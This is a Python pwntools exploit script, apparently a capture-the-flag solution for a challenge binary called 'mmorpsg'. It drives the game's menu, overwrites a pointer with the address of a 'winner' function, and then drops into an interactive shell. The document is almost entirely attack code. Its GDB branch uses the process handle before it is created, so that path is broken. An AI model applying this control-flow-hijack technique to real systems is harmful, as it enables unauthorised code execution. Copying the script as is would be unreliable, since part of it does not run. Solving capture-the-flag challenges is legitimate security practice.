#!/usr/bin/env python

from pwn import *

context.log_level = 'debug'

BINARY = "./dist/mmorpsg"


def main():

    if args.GDB:
        debugger = gdb.attach(target=p.pid, exe=BINARY, gdbscript="""
            break *main
            break *play_round
            c
        """)
    if args.NET:
        p = remote('localhost', 1337)
    else:
        p = process(BINARY)

    p.recv()
    p.sendline("2")
    p.recvuntil('!!')
    p.sendline("3")
    p.recv()
    p.sendline("r")
    p.recv()
    p.sendline("n")
    p.recv()
    p.sendline("1")
    p.recv()
    p.sendline("36")
    p.recv()
    p.sendline(p64(0x408dc0)) # pointer to winner function
    p.recv()
    p.sendline("3")
    p.recv()
    p.sendline("r")

    # Shell
    p.interactive()


if __name__ == "__main__":
    main()
